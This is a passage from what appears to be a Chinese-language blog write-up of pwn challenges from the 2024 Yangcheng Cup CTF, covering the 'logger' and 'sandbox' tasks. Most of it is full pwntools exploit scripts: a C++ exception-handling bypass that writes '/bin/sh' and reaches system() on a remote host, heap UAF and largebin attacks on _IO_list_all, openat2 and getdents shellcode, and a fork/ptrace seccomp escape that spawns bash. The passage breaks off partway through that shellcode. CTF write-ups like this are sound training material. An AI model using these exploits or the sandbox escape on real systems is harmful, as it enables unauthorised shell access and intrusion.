class="line">p.sendline(payload)</span><br><span class="line">payload = <span class="string">b&#x27;Host: 256.256.256.256\r&#x27;</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">payload = <span class="string">b&#x27;Content-Length: 1\r&#x27;</span></span><br><span class="line">p.sendline(payload)</span><br></pre></td></tr></table></figure><p>读取flag：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">path = <span class="string">&#x27;./tmp&#x27;</span></span><br><span class="line">payload = <span class="string">&#x27;&#x27;&#x27;get /&#123;&#125; HTTP/1.0\r&#x27;&#x27;&#x27;</span>.<span class="built_in">format</span>(path).encode()</span><br><span class="line">p.sendline(payload)</span><br><span class="line">payload = <span class="string">b&#x27;Host: 256.256.256.256\r&#x27;</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">payload = <span class="string">b&#x27;Content-Length: 1\r&#x27;</span></span><br><span class="line">p.sendline(payload)</span><br></pre></td></tr></table></figure><h3 id="logger"><a href="#logger" class="headerlink" title="logger"></a>logger</h3><p>这道题目打的是<code>C++</code>中的异常处理，存在一个很明显的栈溢出，可是开启了<code>canary</code>，需要用异常处理来绕过</p><img src="/2024/08/28/%E7%BE%8A%E5%9F%8E%E6%9D%AF%202024%20pwn%20writeup/6.png" class="" title="我的图图呢">  <p>这里我一开始想的是打 <code>CHOP</code>，可是附件里并没有给各种依赖，然后我发现了下面这个东东</p><img src="/2024/08/28/%E7%BE%8A%E5%9F%8E%E6%9D%AF%202024%20pwn%20writeup/7.png" class="" title="我的图图呢">  <p>好家伙，这不是直接送我个<code>system</code>函数吗。经过调试，这个地方执行时<code>rdi</code>的值一直为<code>0x4040A0</code></p><img src="/2024/08/28/%E7%BE%8A%E5%9F%8E%E6%9D%AF%202024%20pwn%20writeup/8.png" class="" title="我的图图呢">  <p>这个地方存储了一个用来报错的字符串，我们注意到上面有一个数组，该程序存在一个该数组的越界写</p><img src="/2024/08/28/%E7%BE%8A%E5%9F%8E%E6%9D%AF%202024%20pwn%20writeup/9.png" class="" title="我的图图呢">  <p>当索引为8时我们就能在<code>0x4040A0</code>上写数据，我们可以直接写<code>/bin/sh</code>，然后利用<code>catch</code>中的<code>system</code>来直接getshell</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> pack</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="comment"># p = process([&quot;./ld-linux-x86-64.so.2&quot;, &quot;./pwn&quot;],</span></span><br><span class="line">        <span class="comment"># env=&#123;&quot;LD_PRELOAD&quot;:&quot;./libc.so.6&quot;&#125;)</span></span><br><span class="line"><span class="comment"># p = process([&#x27;./libc.so&#x27;,&#x27;./pwn&#x27;])</span></span><br><span class="line"><span class="comment"># p = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">p=remote(<span class="string">&#x27;139.155.126.78&#x27;</span>,<span class="number">34689</span>)</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"><span class="comment"># context.terminal = [&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;]</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;wt.exe&#x27;</span>, <span class="string">&#x27;-w&#x27;</span>, <span class="string">&quot;0&quot;</span>, <span class="string">&quot;sp&quot;</span>, <span class="string">&quot;-d&quot;</span>, <span class="string">&quot;.&quot;</span>, <span class="string">&quot;wsl.exe&quot;</span>, <span class="string">&quot;-d&quot;</span>, <span class="string">&quot;Ubuntu-22.04&quot;</span>, <span class="string">&quot;bash&quot;</span>, <span class="string">&quot;-c&quot;</span>]</span><br><span class="line"><span class="comment"># context.terminal = [&#x27;wt.exe&#x27;, &#x27;-w&#x27;, &quot;0&quot;, &quot;sp&quot;, &quot;-d&quot;, &quot;.&quot;, &quot;wsl.exe&quot;, &quot;-d&quot;, &quot;Ubuntu-20.04&quot;, &quot;bash&quot;, &quot;-c&quot;]</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"><span class="comment"># ld = ELF(&#x27;./ld-2.31.so&#x27;)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">lg</span>(<span class="params">buf</span>):</span><br><span class="line">    <span class="keyword">global</span> heap_base</span><br><span class="line">    <span class="keyword">global</span> libc_base</span><br><span class="line">    <span class="keyword">global</span> target</span><br><span class="line">    <span class="keyword">global</span> temp</span><br><span class="line">    <span class="keyword">global</span> stack</span><br><span class="line">    <span class="keyword">global</span> leak</span><br><span class="line">    log.success(<span class="string">f&#x27;\033[33m<span class="subst">&#123;buf&#125;</span>:<span class="subst">&#123;<span class="built_in">eval</span>(buf):#x&#125;</span>\033[0m&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">meau</span>(<span class="params">index</span>):</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Your chocie:&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line">rop = <span class="number">0x404200</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>):</span><br><span class="line">    meau(<span class="number">1</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;You can record log details here:&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>*<span class="number">2</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Do you need to check the records?&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">b&#x27;n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">meau(<span class="number">2</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;[!] Type your message here plz:&#x27;</span>)</span><br><span class="line">payload = p64(rop+<span class="number">0x10</span>)*<span class="number">2</span>+<span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span>+<span class="string">b&#x27;;/bin/sh\x00&#x27;</span>+<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">7</span>+p64(rop)*((<span class="number">0x70</span>//<span class="number">8</span>)-<span class="number">5</span>)+p64(rop+<span class="number">0x20</span>)+p64(<span class="number">0x401BC7</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="sandbox-after-competition"><a href="#sandbox-after-competition" class="headerlink" title="sandbox(after competition)"></a>sandbox(after competition)</h3><p>这题是最抽象的，本地通可是远程不通😰😰😰😰😰😰<br>典型的菜单题，申请的堆块大小只访问了<code>0x500-0x1000</code>，<code>delete</code>函数存在明显的 <code>UAF</code> </p><img src="/2024/08/28/%E7%BE%8A%E5%9F%8E%E6%9D%AF%202024%20pwn%20writeup/10.png" class="" title="我的图图呢">  <p>所以直接<code>larginbin attack</code>打<code>_IO_list_all</code>即可，可是这只是恶梦的开始，这题开启了沙箱</p><img src="/2024/08/28/%E7%BE%8A%E5%9F%8E%E6%9D%AF%202024%20pwn%20writeup/11.png" class="" title="我的图图呢">  <p>可以看到程序吧<code>open</code>和<code>openat</code>给ban了，于是我马上想到了<code>openat2</code>，<code>shellcode</code> 如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">shellcode = asm(<span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    mov rax, 0x67616c66</span></span><br><span class="line"><span class="string">    push rax</span></span><br><span class="line"><span class="string">    xor rdi, rdi</span></span><br><span class="line"><span class="string">    sub rdi, 100</span></span><br><span class="line"><span class="string">    mov rsi, rsp</span></span><br><span class="line"><span class="string">    push 0</span></span><br><span class="line"><span class="string">    push 0</span></span><br><span class="line"><span class="string">    push 0</span></span><br><span class="line"><span class="string">    mov rdx, rsp</span></span><br><span class="line"><span class="string">    mov r10, 0x18</span></span><br><span class="line"><span class="string">    push SYS_openat2</span></span><br><span class="line"><span class="string">    pop rax</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">    mov rdi,rax</span></span><br><span class="line"><span class="string">    mov rsi,rsp</span></span><br><span class="line"><span class="string">    mov edx,0x100</span></span><br><span class="line"><span class="string">    xor eax,eax</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">    mov edi,1</span></span><br><span class="line"><span class="string">    mov rsi,rsp</span></span><br><span class="line"><span class="string">    push 1</span></span><br><span class="line"><span class="string">    pop rax</span></span><br><span class="line"><span class="string">    syscall </span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span>)</span><br></pre></td></tr></table></figure><p>在本地执行 <code>shellcode</code> 后可以马上获取到flag，可是远程不行，当时我认为出题者把flag的文件名给改了，所以我写了以下 <code>shellcode</code> 来获取当前目录下的所有文件名：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">shellcode = asm(<span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    mov rax, 0x2f2e</span></span><br><span class="line"><span class="string">    push rax</span></span><br><span class="line"><span class="string">    xor rdi, rdi</span></span><br><span class="line"><span class="string">    sub rdi, 100</span></span><br><span class="line"><span class="string">    mov rsi, rsp</span></span><br><span class="line"><span class="string">    push 0</span></span><br><span class="line"><span class="string">    push 0</span></span><br><span class="line"><span class="string">    push 0</span></span><br><span class="line"><span class="string">    mov rdx, rsp</span></span><br><span class="line"><span class="string">    mov r10, 0x18</span></span><br><span class="line"><span class="string">    push SYS_openat2</span></span><br><span class="line"><span class="string">    pop rax</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line">shellcode += asm(shellcraft.getdents64(<span class="number">3</span>, heap_base + <span class="number">0x300</span>, <span class="number">0x600</span>))</span><br><span class="line">shellcode += asm(shellcraft.write(<span class="number">1</span>, heap_base + <span class="number">0x300</span>, <span class="number">0x600</span>))</span><br></pre></td></tr></table></figure><p>在本地测试是没问题的，可是到远程就依然什么都没有，后面发现远程的 <code>kernel</code> 版本是 <code>5.4</code>，而 <code>openat2</code> 系统调用是在 <code>kernel 5.6</code> 才引入的，所以这种方法作废</p><p>然后我想到了 <code>io_uring</code>，可是依然是本地能获取flag，远程无法获取flag，那大概率就是不知道flag的路径和文件名的问题了，于是比赛中就没有做出来……</p><p>赛后再重新仔细研究了一下题目，发现 <code>seccomp</code> 禁用系统调用的时候并没有直接 <code>return KILL</code>，而是 <code>return TRACE</code>，然后我在项目 <code>The Linux Kernel documentation</code> 上找到了对于该返回值的描述：</p><blockquote><p>SECCOMP_RET_TRACE:<br>When returned, this value will cause the kernel to attempt to notify a ptrace()-based tracer prior to executing the system call. If there is no tracer present, -ENOSYS is returned to userland and the system call is not executed.<br>A tracer will be notified if it requests PTRACE_O_TRACESECCOMP using ptrace(PTRACE_SETOPTIONS). The tracer will be notified of a PTRACE_EVENT_SECCOMP and the SECCOMP_RET_DATA portion of the BPF program return value will be available to the tracer via PTRACE_GETEVENTMSG.<br>The tracer can skip the system call by changing the syscall number to -1. Alternatively, the tracer can change the system call requested by changing the system call to a valid syscall number. If the tracer asks to skip the system call, then the system call will appear to return the value that the tracer puts in the return value register.<br>The seccomp check will not be run again after the tracer is notified. (This means that seccomp-based sandboxes MUST NOT allow use of ptrace, even of other sandboxed processes, without extreme care; ptracers can use this mechanism to escape.)</p></blockquote><p>也就是说我们有办法对 <code>seccomp</code> 进行逃逸，其具体做法为：使用 <code>fork</code> 开一个子进程，子进程需要 <code>ptrace(PTRACE_TRACEME, 0, 0,0);</code> 来允许自己被父进程追踪，父进程需使用 <code>ptrace(PTRACE_ATTACH, pid, 0, 0);</code> 来追踪子进程。然后父进程在 <code>wait()</code> 阻塞等待子进程发起系统调用。一旦捕捉到，则子进程阻塞，父进程继续运行，此时需用 <code>ptrace(PTRACE_0_SUSPEND_SEECOMP, pid, 0, PTRACE_0_TRACESECCOMP);</code> 将被 <code>TRACE</code> 系统的调用改为允许运行，然后 <code>ptrace(PTRACE_SCONT);</code> 来恢复子进程的系统调用执行。由于我们不知道 <code>flag</code> 的路径和文件名是什么，所以直接使用 <code>execve</code> 来拿 <code>shell</code>, <code>exp</code> 如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> pack</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">p = process([<span class="string">&quot;./ld-linux-x86-64.so.2&quot;</span>, <span class="string">&quot;./pwn&quot;</span>],</span><br><span class="line">        env=&#123;<span class="string">&quot;LD_PRELOAD&quot;</span>:<span class="string">&quot;./libc.so.6&quot;</span>&#125;)</span><br><span class="line"><span class="comment"># p = process([&#x27;./libc.so&#x27;,&#x27;./pwn&#x27;])</span></span><br><span class="line"><span class="comment"># p = process(&#x27;./pwn&#x27;)</span></span><br><span class="line"><span class="comment"># p=remote(&#x27;49.234.30.109&#x27;,9999)</span></span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"><span class="comment"># context.terminal = [&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;]</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;wt.exe&#x27;</span>, <span class="string">&#x27;-w&#x27;</span>, <span class="string">&quot;0&quot;</span>, <span class="string">&quot;sp&quot;</span>, <span class="string">&quot;-d&quot;</span>, <span class="string">&quot;.&quot;</span>, <span class="string">&quot;wsl.exe&quot;</span>, <span class="string">&quot;-d&quot;</span>, <span class="string">&quot;Ubuntu-22.04&quot;</span>, <span class="string">&quot;bash&quot;</span>, <span class="string">&quot;-c&quot;</span>]</span><br><span class="line"><span class="comment"># context.terminal = [&#x27;wt.exe&#x27;, &#x27;-w&#x27;, &quot;0&quot;, &quot;sp&quot;, &quot;-d&quot;, &quot;.&quot;, &quot;wsl.exe&quot;, &quot;-d&quot;, &quot;Ubuntu-20.04&quot;, &quot;bash&quot;, &quot;-c&quot;]</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"><span class="comment"># ld = ELF(&#x27;./ld-2.31.so&#x27;)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">lg</span>(<span class="params">buf</span>):</span><br><span class="line">    <span class="keyword">global</span> heap_base</span><br><span class="line">    <span class="keyword">global</span> libc_base</span><br><span class="line">    <span class="keyword">global</span> target</span><br><span class="line">    <span class="keyword">global</span> temp</span><br><span class="line">    <span class="keyword">global</span> stack</span><br><span class="line">    <span class="keyword">global</span> leak</span><br><span class="line">    log.success(<span class="string">f&#x27;\033[33m<span class="subst">&#123;buf&#125;</span>:<span class="subst">&#123;<span class="built_in">eval</span>(buf):#x&#125;</span>\033[0m&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">meau</span>(<span class="params">index</span>):</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;5. Exit&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">index,size</span>):</span><br><span class="line">    meau(<span class="number">1</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Index:&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Size&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(size))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line">    meau(<span class="number">4</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Index&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">bye</span>():</span><br><span class="line">    meau(<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index,Content</span>):</span><br><span class="line">    meau(<span class="number">3</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Index&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Content&#x27;</span>)</span><br><span class="line">    p.send(Content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">index</span>):</span><br><span class="line">    meau(<span class="number">2</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Index&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x500</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x510</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x520</span>)</span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x500</span>)</span><br><span class="line">edit(<span class="number">0</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;aaaaaaaaaaaaaaaa&#x27;</span>)</span><br><span class="line">heap_base = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&quot;\x00&quot;</span>))-<span class="number">0x290</span></span><br><span class="line">lg(<span class="string">&quot;heap_base&quot;</span>)</span><br><span class="line"></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x520</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x510</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">libc_base = u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x1f6cc0</span></span><br><span class="line">lg(<span class="string">&quot;libc_base&quot;</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x500</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x510</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x510</span>)</span><br><span class="line">add(<span class="number">3</span>,<span class="number">0x520</span>)</span><br><span class="line"></span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">add(<span class="number">4</span>,<span class="number">0x550</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">bin</span> = libc_base + <span class="number">0x1f70f0</span></span><br><span class="line">edit(<span class="number">2</span>,p64(<span class="built_in">bin</span>)*<span class="number">2</span>+p64(<span class="number">0</span>)+p64(libc_base+libc.symbols[<span class="string">&#x27;_IO_list_all&#x27;</span>]-<span class="number">0x20</span>))</span><br><span class="line">add(<span class="number">5</span>,<span class="number">0x550</span>)</span><br><span class="line"></span><br><span class="line">order2 = <span class="string">b&#x27;h\x00&#x27;</span>[::-<span class="number">1</span>].<span class="built_in">hex</span>()</span><br><span class="line">order1 = <span class="string">b&#x27;/bin/bas&#x27;</span>[::-<span class="number">1</span>].<span class="built_in">hex</span>()</span><br><span class="line">shellcode = asm(<span class="string">f&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">_start:</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    /* Step 1: fork a new process */</span></span><br><span class="line"><span class="string">    mov rax, 57             /* syscall number for fork (on x86_64) */</span></span><br><span class="line"><span class="string">    syscall                 /* invoke fork() */</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    test rax, rax           /* check if return value is 0 (child) or positive (parent) */</span></span><br><span class="line"><span class="string">    js _exit                /* if fork failed, exit */</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    /* Step 2: If parent process, attach to child process */</span></span><br><span class="line"><span class="string">    cmp rax, 